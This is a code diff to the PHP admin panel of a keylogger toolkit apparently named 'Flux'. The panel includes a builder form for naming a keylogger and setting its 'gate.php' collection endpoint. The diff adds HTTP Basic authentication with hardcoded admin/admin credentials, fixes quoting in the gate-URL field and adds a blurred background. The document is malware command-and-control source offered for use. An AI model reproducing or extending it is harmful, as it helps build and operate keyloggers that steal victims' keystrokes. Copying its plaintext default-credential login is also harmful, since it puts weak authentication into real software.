@@ -1,3 +1,21 @@
+<?php
+
+// Authentification 
+define('ADMIN_LOGIN',     "admin"); 
+define('ADMIN_PASSWORD',  "admin");
+
+
+if (!isset($_SERVER['PHP_AUTH_USER']) 
+	|| !isset($_SERVER['PHP_AUTH_PW']) 
+	|| ($_SERVER['PHP_AUTH_USER'] != ADMIN_LOGIN) 
+	|| ($_SERVER['PHP_AUTH_PW'  ] != ADMIN_PASSWORD)) { 
+  header('HTTP/1.1 401 Unauthorized'); 
+  header('WWW-Authenticate: Basic realm="Please log in to Flux account"');
+  exit("Access Denied: Username and password required."); 
+}
+
+?>
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -178,7 +196,7 @@
 	        <input id="buildName" type="text" value="<?php echo rand(0, 99999999999999);?>" class="form-control" placeholder="Name of keylogger" title="Enter name here">
 
 	        <br> <i class="i material-icons">settings_remote </i> Gate:<br>
-	        <input id="buildGate" type="text" value="<?php echo 'http://' . $_SERVER[HTTP_HOST] . str_replace('flux.php', '', $_SERVER[REQUEST_URI]) . 'gate.php'; ?>" class="form-control" placeholder="gate.php location" title="Enter gate.php location here">
+	        <input id="buildGate" type="text" value="<?php echo 'http://' . $_SERVER["HTTP_HOST"] . str_replace('flux.php', '', $_SERVER["REQUEST_URI"]) . 'gate.php'; ?>" class="form-control" placeholder="gate.php location" title="Enter gate.php location here">
 
 	      </div>
 	      <div class="modal-footer">
@@ -239,6 +257,28 @@
 
 	  </tbody>
 	</table>
+
+	<!-- Background -->
+	<div id="background"></div>
+	
+	<style>
+		#background {
+			z-index: -1;
+			top: 0%;
+			left: 0%;
+			position: absolute;
+			width: 100%;
+			height: 100%;
+			background-repeat: no-repeat;
+			background-size: cover;
+			background-image: url('background.jpg');
+			filter: blur(3px);
+			transition: 0.4s filter linear;
+		}
+		#background:hover {
+			filter: blur(0px); 
+		}
+	</style>
 
 </body>
 </html>
